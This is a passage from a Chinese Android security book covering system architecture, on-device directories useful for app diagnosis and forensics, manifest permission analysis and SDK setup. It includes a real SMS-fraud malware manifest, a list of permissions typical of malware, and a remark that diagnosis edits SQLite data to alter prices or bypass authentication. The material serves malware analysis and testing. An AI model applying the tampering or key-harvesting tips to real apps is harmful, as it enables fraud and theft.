# Android 的基本概念

开始分析前，先通过本章简单了解一下Android的基本概念。很多开发相关书籍都涉及了Android概念，所以本书只会提及一些必要的内容。本书重点不是内核区域，而会针对恶意代码分析和应用程序诊断，从应用程序和服务角度进行说明。

### 1.1 Android 的架构

Android是由Android Inc.开发的基于Linux平台的操作系统。谷歌公司收购后对其进行了修改，使其更适合在智能手机、平板电脑、相机、机顶盒等触屏设备上运行。使用Android系统的用户在不断增加，韩国国内80%以上的用户都在使用Android系统。越来越多的人关注Android系统的同时，相应的安全威胁也呈现增长趋势。

学习Android应用程序的基本结构前，先简单了解一下Android的系统架构。本书不会逐一讲解系统架构，只简单介绍不同区域。图1-1是很多文档中常见的Android系统架构。

 </div>

(出处：http://www.techdesignforums.com/practice/technique/android-for-the-rest-of-us)

#### 1.1.1 Linux 内核

最底层由Linux内核构成。Android系统以部分结构微调后的Linux 2.6内核版本为基础，该层由相机、声卡、Wi-Fi、键盘等多种驱动程序构成。Android的安全、内存管理、进程管理、网络协议栈、驱动模型等主要系统服务都依赖于Linux。内核会在硬件和软件栈的剩余部分起到抽象层的作用。

用户在应用程序启动后运行的Windows或Linux等传统平台上工作。例如，用户安装并运行软件时，软件的执行权限与用户权限相同。假如该软件是恶意软件，其访问或窃取用户计算机中的敏感信息时，都会得到操作系统的许可。因为Windows和Linux都会在相同的用户权限下运行所有进程。

#### 1.1.2 库

Linux内核的上层是Android的本地库，这些库是用C/C++语言编写的。库会使用Android系统的多个组件，通过Android应用程序框架（库的上层）展示给程序员。这些库也会在Linux内核中以进程方式运行。

库只是告知设备多种数据处理方式的命令集合。比如，媒体库支持录制或播放音频、视频格式。一部分重要的库如下表所示。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>库</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>系统C库</td><td style='text-align: center; word-wrap: break-word;'>嵌入式Linux设备专用，是继承了BSD而实现的标准C库</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SQLite</td><td style='text-align: center; word-wrap: break-word;'>可在所有应用程序中存储数据。虽然小，但是一个功能强大的关系型数据库引擎（渗透测试时可用于查看数据库中的所有敏感数据）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>WebKit</td><td style='text-align: center; word-wrap: break-word;'>提供网页检索工具的浏览器引擎（渗透测试时用于查看所有敏感页面缓存）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Surface Manager</td><td style='text-align: center; word-wrap: break-word;'>负责设备屏幕上的图形图像</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>OpenGL</td><td style='text-align: center; word-wrap: break-word;'>在屏幕上绘制2D或3D图形图像</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>媒体库</td><td style='text-align: center; word-wrap: break-word;'>播放或录制音频、视频格式（mp3、mpeg4、jpg、png等）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3D库</td><td style='text-align: center; word-wrap: break-word;'>基于OpenGL API，是硬件3D加速软件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SGL</td><td style='text-align: center; word-wrap: break-word;'>支持2D图形图像</td></tr></table>

#### 1.1.3 Android 运行时

Android运行时（Runtime）与库位于相同的层，以核心Java库和Dalvik构成。核心Java库用于开发Android应用程序。

众所周知，虚拟机是拥有操作系统的虚拟环境。Android使用Dalvik虚拟机概念，这样可以有效运行多个虚拟机。Android操作系统使用这些虚拟机将各应用程序运行为自己的进程。

Dalvik是由谷歌公司的Ban Bornstrein及其团队开发的，这个词源于Ban Bornstrein的祖先居住的一个冰岛村庄。Dalvik虚拟机的构建过程与JVM（Java Virtual Machine，Java虚拟机）类似，但前者使用Dex编译器进行转换，生成位元码后运行，如图1-2所示。这是考虑到当时的移动环境而设计的

性能，也是因为被Sun公司的Open Java（Open JDK和Apache Harmony项目）替代了的缘故。

 </div>

Dalvik虚拟机的主要特点如下。

☐ 优化内存管理。

☐ 各应用程序未授权时不可干涉其他应用程序。

☐ 支持threading。

图1-3以图片形式表示Android环境。各Android应用程序在各自的虚拟实例中运行，每个应用程序会获得分配好的固定用户ID。

 </div>

从图1-4可以看到设备中安装的工具包，并能看到以app_为前缀赋予了用户ID。简言之，就是每个进程都有一个Linux用户。

 </div>

输入ps命令查看进程信息时，可以看到最左侧每个进程持有的用户权限。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td colspan="2"># ps | more</td></tr></table>

#### 1.1.4 应用程序与框架

库之上的层是应用程序框架，包含资源分配、语音通话等管理智能手机基本功能的程序。程序员使用此框架API开发更加复杂的应用程序。

该框架的一部分重要的“块”管理资源管理器，谷歌地图和GPS等定位服务、应用程序生命周期的Activity管理、语音通话管理、应用程序之间共享的数据管理内容提供商等均属此类。

栈的最上层是应用程序。与邮件地址、SMS账户、地图、浏览器等通过Android市场开发并发布的应用程序一样，也包含随Android系统一起提供的应用程序。

#### 1.1.5 设备文件目录结构

本节讲解设备的主要文件目录。阅读本节之前，必须先搭建ADB（Android Debug Bridge）环境，所以请先阅读第2章。输入adb shell mount命令后可以看到如图1-5所示的多个分区。

 </div>

 </div>

主要文件目录的功能请参考表1-1。诊断应用程序时会经常从如下相应目录获得重要信息。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>文件目录</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/</td><td style='text-align: center; word-wrap: break-word;'>只有读取权限的根（root）文件系统目录。浏览启动相关设置文件，包含初始进程信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/system</td><td style='text-align: center; word-wrap: break-word;'>只有Android系统读取权限的主目录，包括具备HAL和框架的库文件、守护进程相关可执行文件、字体、媒体、系统应用程序</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/data</td><td style='text-align: center; word-wrap: break-word;'>有读写权限，该文件系统目录包括可设置的用户应用程序及状态信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/cache</td><td style='text-align: center; word-wrap: break-word;'>有读写权限，包括浏览器缓存和用户临时状态信息</td></tr></table>

安装的应用程序会因为各种目的保存到系统目录。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>文件目录</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/system/app/应用名.apk</td><td style='text-align: center; word-wrap: break-word;'>保存系统应用程序，优化后的dex代码保存到/system/app/应用名.odex。以安全模式启动时，运行可操作的系统应用（代码P28 第一段）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ls -l more</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ls -l more</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>9888 2012-06-08 06:58 SkafLauncher.odex</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>25872 2012-06-08 06:58 VisualizationWallpapers.odex</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>2240033 2012-06-08 06:58 GoogleServicesFramework.apk</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>36032 2012-06-09 06:58 ItsService.odex</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>482600 2012-06-09 06:58 SelfTestMode.apk</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>3490788 2012-06-08 06:58 ClockPackage.apk</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>137632 2012-06-08 06:58 CSC.odex</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>19118 2012-06-08 06:58 PackageInstaller.apk</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>29575 2012-06-08 06:58 SKITworkTool.apk</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>54624 2012-06-08 06:58 Stk.odex</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>185223 2012-06-08 06:58 DualClock.apk</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>8910 2012-06-08 06:58 Preconfig.apk</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>18424 2012-06-08 06:58 SamsungWidget_ProgramMonitor.odex</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>10294 2012-06-08 06:58 PhoneErrService.apk</td></tr></table>

(续)

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>文件目录</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/data/app/应用名.apk</td><td style='text-align: center; word-wrap: break-word;'>保存已注册的用户应用程序，优化后的dex代码保存到/data/dalvik-cache/应用名.odex</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/data/app/&lt;app-package-name&gt;</td><td style='text-align: center; word-wrap: break-word;'>保存用户下载的应用程序，优化后的dex代码保存到/data/dalvik-cache/data@app@&lt;app-package-name&gt;-1.apk@classes.dex（代码P28 第二段）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-1.apk</td><td style='text-align: center; word-wrap: break-word;'># cd /data/dalvik-cache/cd /data/dalvik-cache/# lslsdata@app@con.tegrak.lagfix-1.apk@classes.dexsystem@app@HDUidooCall.apk@classes.dexdata@app@stericson.busybox-2.apk@classes.dexsystem@app@DummySrn.apk@classes.dexsystem@app@GoogleFeedback.apk@classes.dexsystem@app@RinstallAgent.apk@classes.dexsystem@app@U3MobileInstaller.apk@classes.dex</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/mnt/secure/asec/&lt;app-package</td><td rowspan="2">保存移动到SD卡的应用程序，优化后的dex代码保存到/data/dalvik-cache.nbt@asec@&lt;app-package-name&gt;-1@pkg.apk@classes.dex</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-name&gt;-1.asec</td></tr></table>

这些目录中，能获取最多应用程序信息的是“/data/data/应用名”。访问相应应用程序时使用如下命令。

cd /data/data/com.google.android.talk

 </div>

虽然每个应用程序都不同，但是保存数据和设置文件比较多的应用程序会有如下目录结构。诊断应用程序漏洞或对移动设备取证时，需仔细查看如下目录，因为影响应用程序服务的重要信息全部保存于此。比如服务认证密钥、内容数据、应用程序设置文件等。

1s -1
drwxrwx--x app_24 app_24 2013-06-11 14:01 files
drwxr-xr-x system system 2013-06-11 13:24 lib
drwx----- app_24 app_24 2014-01-27 14:42 databases
drwxrwxrwx app_24 app_24 2013-06-11 13:27 usrdata
-rw-rw-rw- app_24 app_24 6 2013-06-11 14:12 widget1.set
drwxrwx--x app_24 app_24 2013-06-17 12:46 cache

-rw----- app_24 app_24
drwxrwx--x app_24 app_24

183 2013-06-11 13:27 device_token.txt
2014-01-27 14:35 shared_prefs

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>目录</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>files</td><td style='text-align: center; word-wrap: break-word;'>保存管理员内部使用的文件（包括so文件、data文件、ini文件等）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>lib</td><td style='text-align: center; word-wrap: break-word;'>保存应用程序请求的库文件（存在so文件）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>databases</td><td style='text-align: center; word-wrap: break-word;'>包含设置文件、内容文件等的查询信息的SQLite数据库文件（存在db文件）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>cache</td><td style='text-align: center; word-wrap: break-word;'>有读写权限，包括浏览器缓存和用户临时状态信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>shared_prefs</td><td style='text-align: center; word-wrap: break-word;'>保存为XML文件，是应用程序共享的设置文件</td></tr></table>

其中，shared_prefs目录内的preferences.xml文件包含应用程序的设置文件。因为包括升级、版本信息等内容，所以恶意访问时（或诊断漏洞时），此处会包含API密钥的盗用、认证密钥值等信息。

<?xml version='1.0' encoding='utf-8' standalone='yes'?>
<map>
<int name="whitelistrevision" value="1" />
<string name="productversion">2.0.1.1(Build 12)</string>
<string name="patchahnuibuilddate">2.0.4.61</string>
<int name="profilerevision" value="111" />
<int name="versioncode" value="61" />
<boolean name="initialzingstate" value="true" />
<string name="patchurl">http://www.test.co.kr/updates</string>
<string name="updateahnuibuilddate">2013.02.03.00</string>
<string name="productbuildnumberdate">2.0.4.11</string>
<string name="engineversion">2013.02.03.00</string>
</map>

下一个重要文件是保存于databases的db文件，它是SQLite数据库形式，可以使用SQLite数据库浏览器查看结构、浏览数据。

SQLite数据库浏览器工具下载URL：http://sourceforge.net/projects/sqlitebrowser/.

 </div>

如图1-8所示，访问某应用程序中的db文件。该db文件包括应用程序设置信息和结果导出语句。使用adb pull命令将需要分析的文件下载到个人PC。(adb命令参见第2章。)

 </div>

 </div>

其他常用工具还有SQLite Expert $ ^{①} $。SQLite Expert有个人版(Personal)和专业版(Professional)。

各位可以在两个工具之间随意挑选。我们只对SQLite数据库信息进行简单查询，所以二者在功能上没有太大区别（诊断漏洞时也会修改一些数据库信息，以修改价格或绕过认证）。

 </div>

 </div>

使用本地PC检索工具Everthing查找所有已经保存的数据库文件（.db）时，会找到很多有趣的信息。数字取证时经常会用到这些信息，希望各位不仅要检查移动设备数据库，也要检查浏览器、应用程序数据库，看看有什么隐藏信息。

 </div>

## 1.2 Android 重要组件

Android由Activity、服务（Service）、内容提供商（Content Provider）、广播接收器（Broadcast Receiver）等4种主要功能组成。本书并不面向程序员，所以仅作简单介绍。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>组件</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Activity</td><td style='text-align: center; word-wrap: break-word;'>向用户显示的设备界面。通过点击菜单或按钮等特定动作转换的画面都可以称为Activity</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>服务</td><td style='text-align: center; word-wrap: break-word;'>不显示到屏幕，在后台运行。如网络传输、读取文件等操作。Activity显示画面时，服务功能通常一同运行</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>内容提供商</td><td style='text-align: center; word-wrap: break-word;'>应用程序共享的空间。即使数据保存到文件系统或其他地方，应用程序也能通过内容提供商访问数据</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>广播接收器</td><td style='text-align: center; word-wrap: break-word;'>实时查看系统状态（电池状态、邮件提醒等），发生事件时响应。利用设备中发生的Notification等向用户发出警报</td></tr></table>

#### 1.2.1 Activity

Android环境中，Activity大都在同一个画面显示。例如，在首页（Main Activity）点击一个按钮，就会跳转访问下一个页面（Second Activity），之后又会以其他动作触发另外的Activity。

此类Activity的执行就像图1-13的Java表示的生命周期。即使第二个Activity显示到屏幕，第一个Activity也会保存到其他空间，并变为静止状态（Stopped）。用户回到之前的Activity时立即显示，无需等待。

 </div>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>状态</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>启动（Starting）</td><td style='text-align: center; word-wrap: break-word;'>Activity启动时，如果内存中没有相关信息，就以启动状态运行。回调函数执行操作，并转换为运行状态</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>运行（Running）</td><td style='text-align: center; word-wrap: break-word;'>显示到用户屏幕，并实际在Activity上执行各项动作。输入文字或触摸屏幕时的状态</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>待机（Paused）</td><td style='text-align: center; word-wrap: break-word;'>虽然屏幕上依然显示，但焦点（Focus）并不位于此处。例如，特定信息使对话框弹出到Activity之前时</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>停止（Stopped）</td><td style='text-align: center; word-wrap: break-word;'>虽然不显示到屏幕，但仍存在于内存。用户可以随时从下一个Activity的执行过程迅速回到当前Activity</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>销毁（Destroyed）</td><td style='text-align: center; word-wrap: break-word;'>从内存中销毁</td></tr></table>

#### 1.2.2 Service

Service不会显示给用户，如图1-14所示，其运行过程与Activity运行过程相同。听音乐或录音都在后台运行，与其他软件的运行是同时的，这些都属于Service的功能。Activity和Service都以名为UI线程的相同应用程序线程执行。

 </div>

#### 1.2.3 Content Provider

Content Provider是应用程序之间共享数据的界面。Android的每个应用程序都默认在Sandbox中运行，所以与系统中的其他应用程序相互分隔，不能直接访问数据。Content Provider遵守CURD（Create、Update、Read、Delete，创建、更新、读取、删除）原则。应用程序通过Intent共享小数据。Content Provider适合共享音乐文件、图片文件等大容量文件。

### 1.3 Android 应用程序的基本结构

分析Android系统之前，首先要了解Android应用程序的编写顺序，因为理解了编译过程才能了解反编译过程。Android应用程序的开发顺序如图1-15所示。源代码编译后生成apk文件，该文件和压缩文件一致。apk文件大致包含.dex文件、resources文件、uncompiled resources文件、AndroidMainfest.xml文件。之后须经过signing过程才能在模拟器或移动设备上正常运行。

 </div>

(出处：http://developer.android.com/tools/building/index.html#detailed-build)

本章将简单介绍生成apk文件的结果和权限。新建Android项目后，生成如图1-16所示的目录和文件。（第2章将详细介绍测试应用程序生成方法）

 </div>

cmp=com.example.android.accelerometerplay/.AccelerometerPlayActivity }
[2014-01-27 18:47:24 - Mobile-Test] ------
[2014-01-27 18:47:24 - Mobile-Test] Android Launch!
[2014-01-27 18:47:24 - Mobile-Test] adb is running normally.
[2014-01-27 18:47:24 - Mobile-Test] Performing
com.example.mobile_test.MainActivity activity launch
[2014-01-27 18:47:24 - Mobile-Test] Automatic Target Mode: Unable to detect device
compatibility. Please select a target device.
[2014-01-27 18:47:31 - Mobile-Test] Uploading Mobile-Test.apk onto device
'emulator-5554'
[2014-01-27 18:47:35 - Mobile-Test] Installing Mobile-Test.apk...
[2014-01-27 18:47:37 - Mobile-Test] Success!
[2014-01-27 18:47:37 - Mobile-Test] Starting activity
com.example.mobile_test.MainActivity on device emulator-5554
[2014-01-27 18:47:38 - Mobile-Test] ActivityManager: Starting: Intent
{ act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER]
cmp=com.example.mobile_test/.MainActivity }

下面解压并查看用于测试的apk文件。如图1-17所示，把下载的apk文件或安装于移动设备的apk文件的扩展名修改为.zip后，即可使用常用的免费压缩软件ALZip或7-zip解压。

 </div>

解压后可以看到如图1-18所示的文件夹和文件，此处须仔细查看AndroidManifest.xml文件和classes.dex文件。分析恶意代码时可以从其他源文件内包含的多种图片和信息中获得提示，诊断应用程序时需考虑收费软件中可能包含内容文件。

 </div>

AndroidManifest.xml文件位于项目根目录，该文件包含了对组件的定义和应用程序的使用权限。Android中有很多可能遭恶意使用的API，所以要查看是否存在使用权限外的多余权限。

查看解压后的AndroidManifest.xml文件时显示乱码，因为当前是二进制格式，需要将其转换为xml文件格式才能正常显示。

如果只想转换一个XML文件，可以使用AXML Printer $ ^{①} $，但我使用另一个反编译软件apktool.bat $ ^{②} $。

 </div>

用调试模式解压程序。使用调试模式后，xml文件也同时转换为明文字符，可直接查看。图1-20中的两个文件是实际用作恶意代码的应用程序。

 </div>

请看如下从正常程序提取的xml文件，显示了API层级版本信息和Activity信息。重要的是使用权限，此处只包含了INTERNET和READ_PHONE_STATE的API信息。

<?xml version="1.0" encoding="UTF-8"?>
<manifest android:versionCode="1" android:versionName="1.0.0" package="android.game"
         xmlns:android="http://schemas.android.com/apk/res/android">

<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />
<application android:label="@string/app_name" android:icon="@drawable/icon">
    <activity android:label="@string/app_name" android:name=".MainAct">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
</application>
</manifest>

下列示例分析了Android恶意代码应用程序。从Activity名推测，它应该是在中国开发的。通过下端的权限信息可知，存在SMS相关API。这部分比较危险，会利用SMS扣除话费或发送垃圾短信。

自动分析恶意程序代码的工具会浏览该xml文件，以判断是否存在发生危险行为的API。

<?xml version="1.0" encoding="UTF-8"?>
<manifest android:versionCode="1" android:versionName="1.0" package="com:mobile.app.writer.zhongguoyang"
<xmlns:android="http://schemas.android.com/apk/res/android">
<application android:label="@string/app_name"
android:icon="@drawable/icon">
<activity android:label="@string/app_name"
android:name=".ZhongGuoYangActivity">
<intent-filter>
<action android:name="android.intent.action.MAIN" />
<category android:name="android.intent.category.LAUNCHER" />
</intent-filter>
</activity>
<activity>
<android:theme="@android:style/Theme.Black.NoTitleBar.FULLSCREEN"
android:name="VideoPlayerActivity"
android:configChanges="keyboardHidden|orientation" />
<activity android:theme="@style/Theme.CustomDialog"
android:label="?于" android:name=".AboutActivity" />
<meta-data android:name="Wooboo_PID"
android:value="1a27f9a5e5f74dedafb56c3dd6f3475f" />
<meta-data android:name="Market_ID" android:value="177" />
<service android:name="com.android.main.MainService"
android:process=":main" />
<receiver android:name="com.android.main.ActionReceiver">
<intent-filter>
<action android:name="android.intent.action.SIG_STR" />
</intent-filter>
</receiver>
<receiver android:name="com.android.main.SmsReceiver">
<intent-filter android:priority="100000">
<action android:name="android.provider.Telephony.SMS_RECEIVED" />
</intent-filter>
</receiver>
<activity android:theme="@android:style/Theme.Dialog"

android:name="com.android.main.TANCActivity" />
</application>
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.SEND_SMS" />
<uses-permission
android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS" />
<uses-permission
android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS" />
<uses-permission android:name="android.permission.INSTALL_PACKAGES" />
<uses-permission
android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />
</manifest>

如图1-21所示，开发应用程序时，使用开发工具提供的功能设置AndroidManifest.xml文件的Permissions选项，即可反映用户权限。

 </div>

编写恶意代码时也能简单适用。通常会调制正常的应用程序，先反编译为原应用程序后，使用XML编辑器直接修改源代码权限。

下面是调查了多个恶意应用程序后得到的、添加到AndroidManifest.xml文件的不必要的权限目录。虽然不能断定拥有这些权限的就是恶意应用程序，但对分析恶意代码应用程序功能有很大参考价值。通过后面的名称（Name）可以判断执行何种功能。

android.permission.SEND_SMS, android.permission.RECEIVE_SMS
android.permission.SYSTEM_ALERT_WINDOW
com.android.browser.permission.READ_HISTORY_BOOKMARKS,
com.android.browser.permission.WRITE_HISTORY_BOOKMARKS

android.permission.READ_CONTACTS, android.permission.WRITE_CONTACTS,

android.permission.READ_CALENDAR, android.permission.WRITE_CALENDAR

android.permission.CALL_PHONE

android.permission.READ_LOGS

android.permission.ACCESS_FINE_LOCATION

android.permission.GET_TASKS

android.permission.RECEIVE_BOOT_COMPLETED

android.permission.CHANGE_WIFI_STATE

#### ☑️ 可以通过权限的数字判断是否为恶意代码吗？

F-Secure开发公布了一款很有趣的应用程序，它会检查用户手机上安装的所有应用程序的权限(Permission)，并把权限的数字显示在程序图标旁。我刚开始认为这个程序很有意思，但后来发现，它只显示权限数字及其说明。用户会误以为权限大的软件就是恶意软件。下面是Android市场中注册的应用程序说明图片，人们常用的网络电话Viber位列第一，因为其使用权限最大。

我们必须赋予自己常用的SNS和视频通话、语音通话等服务很大权限，因为此类软件需要用户的很多信息。

https://play.google.com/store/apps/details?id=com.fsecure.app.permissions.privacy

 </div>

图1-23摘自论文“Dissecting Android Malware: Characterization and Evolution”，统计分析了恶意软件权限（左）和从Android市场正常下载的免费软件权限。可以发现，虽然权限

类型相似，但恶意代码使用的权限数字（频率）很高，这说明恶意代码会要求大量权限以访问个人信息。

 </div>

以上述信息为参考，要想更准确地判断是否为恶意代码，可以为其权限按比例赋分，高于平均分的即可判断为疑似恶意应用程序。也就是说，恶意代码会经常依序使用INTERNET、READ PHONE_STATE等权限，所以为这些权限赋予高分；对READ PHONE_STAT等正常使用的权限，可以赋予低分。

可参考下列网址。

□ http://ant.apache.org/binddownload.cgi
□ http://developer.android.com/tools/projects/projects-cmdline.html#UpdatingAProject
□ http://mrkn.co/s/post/1473/Android_Security_Underpinnings.htm
□ http://www.csc.ncsu.edu/faculty/jiang/pubs/OAKLAND12.pdf

### 1.4 小结

本章讲解了Android系统的基本结构。如果以开发为目的，则需要深入学习基本概念和各组成部分。但分析或诊断恶意代码时，只查看应用程序功能也不会影响分析。第2章将讲解分析应用程序必备的环境构建方法。

# Android 应用程序诊断环境

第2章将讲解如何构建分析Android应用程序时所需的移动设备环境和无线网络。分析Android系统前，需要安装开发软件时必备的SDK和相关工具。执行应用程序诊断时，不仅需要工具包中的模拟器，而且需要实际的设备。虽然使用现有设备也可以进行诊断，但是为了利用所有工具，必须切换（rooting）移动平台。这样并不安全，但这是诊断时的必经过程。

### 2.1 构建 Android 环境

本节是进入Android系统诊断、分析之前的环境构建阶段。首先查看Windows环境和Linux环境。分析恶意代码时，通常会使用虚拟机（模拟器）；但分析正常应用程序时，会使用真实的移动终端。因为应用程序的某些功能在模拟器上无法运行，并且性能也有限。无论是在模拟器上进行诊断还是在真实设备上诊断，都需要构建Android开发环境。

#### 2.1.1 安装Android SDK

构建Android诊断环境之前，需要安装Java开发工具JDK（或JSE）。安卓以Java语言为基础，未安装JDK将无法诊断。

下载URL：http://www.oracle.com/technetwork/java/javase/downloads/index.html

 </div>

#### ☑ 如果安装Windows 7 64位环境时出现错误

现在，大多数用户都在使用64位 Windows 7系统。64位环境下的JDK和Android SDK、Eclipse之间的搜索环境不同，经常会出现错误。因此，请先参考下列内容，再继续阅读本书。

下文参考了http://www.098.co.kr/?mid=blog&category=31862&document_srl=36613（短链接；http://goo.gl/T21ew9）。

口从 http://www.oracle.com/technetwork/java/javase/downloads/index.html 下载 JDK 后安装。必须安装32位版本。即使操作系统是64位的，安装64位JDK后，Android SDK也无法识别。此外，还必须设置PATH变量。

☐ 从http://www.eclipse.org/downloads/下载32位Eclipse。解压后移动到适当的位置。(请参考后面的内容。)

☐ 从http://developer.android.com/sdk/index.html下载Android SDK后安装。选择相应的平台下载并安装。

为了测试Android平台的应用程序（与开发应用程序时一致），首先学习Android SDK的安装过程。

从http://developer.android.com/sdk/index.html可以下载到适用于Windows、Mac OS X、Linux（i386）等各种环境的SDK。本节学习构建Windows环境的方法。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>平台</td><td style='text-align: center; word-wrap: break-word;'>工具包</td><td style='text-align: center; word-wrap: break-word;'>大小</td><td style='text-align: center; word-wrap: break-word;'>SHA-1校验和</td></tr><tr><td rowspan="2">Windows</td><td style='text-align: center; word-wrap: break-word;'>installer_r24.2-windows.exe (Recommended)</td><td style='text-align: center; word-wrap: break-word;'>107849819字节</td><td style='text-align: center; word-wrap: break-word;'>e764ea93aa72766737f9be3b9fb3e42d879ab599</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>android-sdk_r24.2-windows.zip (Recommended)</td><td style='text-align: center; word-wrap: break-word;'>155944165字节</td><td style='text-align: center; word-wrap: break-word;'>2611ed9a6080f4838f1d4e55172801714a8a169b</td></tr></table>

(续)

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>平台</td><td style='text-align: center; word-wrap: break-word;'>工具包</td><td style='text-align: center; word-wrap: break-word;'>大小</td><td style='text-align: center; word-wrap: break-word;'>SHA-1校验和</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Mac OS X</td><td style='text-align: center; word-wrap: break-word;'>android-sdk_r24.2-macosx.zip</td><td style='text-align: center; word-wrap: break-word;'>88949635字节</td><td style='text-align: center; word-wrap: break-word;'>256c9bf642f56242d963c090d147de7402733451</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Linux</td><td style='text-align: center; word-wrap: break-word;'>android-sdk_r24.2-linux.tgz</td><td style='text-align: center; word-wrap: break-word;'>168119905字节</td><td style='text-align: center; word-wrap: break-word;'>1a29f9827ef395a96db629209b0e38d5e2dd8089</td></tr></table>

 </div>

解压zip文件后能看到如图2-3所示的AVD管理器，运行后可根据API版本选择是否安装。可以安装各个版本的最新版，这对之后的测试有利，也可以选择全部安装。选择对象的多少会决定安装速度，我的网速有限，用了1小时左右。

 </div>

选择需要的工具包后，点击Install OO Packages即可开始安装。如果认为耗费的时间太多，可以分别只选择2.x、3.x、4.x版本的最新版安装。

安装过程中如果出现授权窗口，可以选择Accept All。如果出现其他选项，就选择Accept后点击Install按钮。

 </div>

API级别对之后的Android开发与分析过程中的设备兼容、软件管理生命周期等起到至关重要的作用。分析者获取应用程序开发环境相关信息后，在模拟器上也要使用相同的API级别。各版本API级别请参考下列网址。

http://developer.android.com/guide/topics/manifest/uses-sdk-element.html#ApiLevels（短链接：http://goo.gl/s7cFrs）

安装完成后会看到如图2-5所示的内容，这样就结束了SDK的安装。

 </div>

#### 2.1.2 安装ADK

下面构建Android开发环境，以分析APK文件或修改文件。

